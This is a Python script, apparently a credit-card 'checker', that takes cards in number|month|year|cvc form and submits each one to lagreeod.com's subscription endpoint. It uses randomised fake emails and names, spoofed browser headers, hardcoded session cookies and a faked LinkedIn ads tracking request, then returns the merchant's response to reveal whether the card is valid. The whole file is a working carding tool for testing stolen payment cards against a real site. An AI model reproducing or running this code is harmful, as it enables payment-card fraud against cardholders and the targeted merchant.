import requests
import user_agent
import random
import time
def Tele(ccx):
		ccx=ccx.strip()
		n = ccx.split("|")[0]
		mm = ccx.split("|")[1]
		yy = str(ccx.split("|")[2][2:])
		cvc = ccx.split("|")[3]
		user = str(user_agent.generate_user_agent)
		emil = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=20)) + '@gmail.com'
		cookies = {
		    'li_sugr': 'e09ffcb7-b77e-4097-b7ac-d3b5a1db1c0a',
		    'bcookie': '"v=2&862e192b-3866-46d2-8415-c4ef3e14965a"',
		    'lidc': '"b=OGST08:s=O:r=O:a=O:p=O:g=2897:u=1:x=1:i=1718742716:t=1718829116:v=2:sig=AQF9UIh6_d3D96og4-xzNWfnLqauYlOZ"',
		    'UserMatchHistory': 'AQLBRItSo1gjfgAAAZAxW4p41XZv2VlsLyySsZk2ah-sqThe1O5ESrZiLHO6yZ4rWafZsJYxhyRVaw',
		    'AnalyticsSyncHistory': 'AQIkuKPac3f59wAAAZAxW4p4th6h2yTYx59fxmc6-WonIj6NJQCqIwsvwXEiXcJW7t43APJ4YDss2_1UTAZejA',
		}
		
		headers = {
		    'authority': 'px.ads.linkedin.com',
		    'accept': '*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'text/plain;charset=UTF-8',
		    # 'cookie': 'li_sugr=e09ffcb7-b77e-4097-b7ac-d3b5a1db1c0a; bcookie="v=2&862e192b-3866-46d2-8415-c4ef3e14965a"; lidc="b=OGST08:s=O:r=O:a=O:p=O:g=2897:u=1:x=1:i=1718742716:t=1718829116:v=2:sig=AQF9UIh6_d3D96og4-xzNWfnLqauYlOZ"; UserMatchHistory=AQLBRItSo1gjfgAAAZAxW4p41XZv2VlsLyySsZk2ah-sqThe1O5ESrZiLHO6yZ4rWafZsJYxhyRVaw; AnalyticsSyncHistory=AQIkuKPac3f59wAAAZAxW4p4th6h2yTYx59fxmc6-WonIj6NJQCqIwsvwXEiXcJW7t43APJ4YDss2_1UTAZejA',
		    'origin': 'https://www.lagreeod.com',
		    'referer': 'https://www.lagreeod.com/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-platform': '"Linux"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': user,
		}
		
		data = '{"pids":[5143044],"scriptVersion":156,"time":1718815236645,"domain":"lagreeod.com","url":"https://lagreeod.com/subscribe","pageTitle":"Subcribe to Lagree Fitness On Demand | Virtual Lagree Fitness Classes - Lagree On Demand","websiteSignalRequestId":"0fd75e5d-8c44-2232-646a-aad2ac1b854d","isTranslated":false,"liFatId":"","liGiant":"","misc":{"psbState":-4},"isLinkedInApp":false,"hem":null,"signalType":"CLICK","href":"","domAttributes":{"elementSemanticType":null,"elementValue":null,"elementType":"submit","tagName":"BUTTON","backgroundImageSrc":null,"imageSrc":null,"imageAlt":null,"innerText":"START YOUR SUBSCRIPTION","elementTitle":null,"cursor":"pointer","formAction":"register/validate_subscribe","isFormSubmission":true},"innerElements":null,"elementCrumbsTree":[{"tagName":"main","nthChild":5,"id":"site-root"},{"tagName":"section","nthChild":0,"classes":["mbsec","pb-05","pt-0","px-2"]},{"tagName":"div","nthChild":0,"classes":["container1080","mb-05"]},{"tagName":"form","nthChild":1,"id":"register_subscribe","classes":["flex","nowrap","row"],"attributes":{"action":"register/validate_subscribe","data-gtm-form-interact-id":"0"}},{"tagName":"div","nthChild":2,"classes":["col","mb-mob-3","order-mob-1","pl-4","pr-0","px-mob-1","w100"]},{"tagName":"div","nthChild":0,"classes":["border","for--loading","panel","subsc-right"]},{"tagName":"div","nthChild":12,"classes":["row","w100"]},{"tagName":"div","nthChild":0,"classes":["aic","col-12","flex","jcc","px-0"]},{"tagName":"button","nthChild":0,"classes":["black-bg","btn","btn-tall","btn-wide","f-14","w100","white"]}],"isFilteredByClient":false}'
		
		response = requests.post('https://px.ads.linkedin.com/wa/', cookies=cookies, headers=headers, data=data)
		
		
		cookies = {
		    '_ga': 'GA1.1.777105074.1711957370',
		    '_gcl_au': '1.1.886741420.1711957370',
		    'optiMonkClientId': '42b3177f-139d-a2f9-d22b-99dc134be88f',
		    'ci_session': 'vvt68uln3ivrrvv18vv17j8aomm0uka0',
		    '_ga_4HXMJ7D3T6': 'GS1.1.1718815000.31.1.1718815148.0.0.0',
		    '_ga_KQ5ZJRZGQR': 'GS1.1.1718815000.32.1.1718815148.0.0.0',
		}
		
		headers = {
		    'authority': 'www.lagreeod.com',
		    'accept': 'application/json, text/javascript, */*; q=0.01',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
		    # 'cookie': '_ga=GA1.1.777105074.1711957370; _gcl_au=1.1.886741420.1711957370; optiMonkClientId=42b3177f-139d-a2f9-d22b-99dc134be88f; ci_session=vvt68uln3ivrrvv18vv17j8aomm0uka0; _ga_4HXMJ7D3T6=GS1.1.1718815000.31.1.1718815148.0.0.0; _ga_KQ5ZJRZGQR=GS1.1.1718815000.32.1.1718815148.0.0.0',
		    'origin': 'https://www.lagreeod.com',
		    'referer': 'https://www.lagreeod.com/subscribe',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-platform': '"Linux"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': user,
		    'x-requested-with': 'XMLHttpRequest',
		}
		
		data = {
		    'stripe_customer': '',
		    'subscription_type': 'Weekly Subscription',
		    'firstname': 'Angel',
		    'lastname': 'Rippin',
		    'email': emil,
		    'password': '37736665555',
		    'card[name]': 'ueushsh',
		    'card[number]': n,
		    'card[exp_month]': mm,
		    'card[exp_year]': yy,
		    'card[cvc]': cvc,
		    'coupon': '',
		    's1': '12',
		    'sum': '32',
		}
		
		response = requests.post('https://www.lagreeod.com/register/validate_subscribe', cookies=cookies, headers=headers, data=data)
		
		try:
			ii=(response.text)
		except:
			return 'error'
		return ii
		